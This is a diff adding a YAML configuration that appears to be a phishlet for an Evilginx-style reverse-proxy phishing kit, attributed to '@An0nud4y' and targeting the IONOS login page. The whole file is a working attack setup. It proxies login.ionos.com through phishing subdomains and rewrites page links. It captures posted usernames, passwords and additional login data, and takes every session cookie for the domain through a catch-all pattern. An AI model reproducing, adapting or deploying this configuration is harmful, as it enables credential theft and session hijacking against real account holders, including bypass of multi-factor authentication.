@@ -1,0 +1,33 @@
+
+author: '@An0nud4y' 
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'ionos.com', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: '', domain: 'ionos.com', session: true, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'login.ionos.com', orig_sub: 'login', domain: 'ionos.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.ionos.com', orig_sub: '', domain: 'ionos.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: '.ionos.com'
+    keys: ['.*,regexp']
+auth_urls:
+  - ''  
+credentials:
+  username:
+    key: 'oaologin.username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'oaologin.password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    key: 'oaologin.additionaldata'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'login.ionos.com'
+  path: '/' 
+  
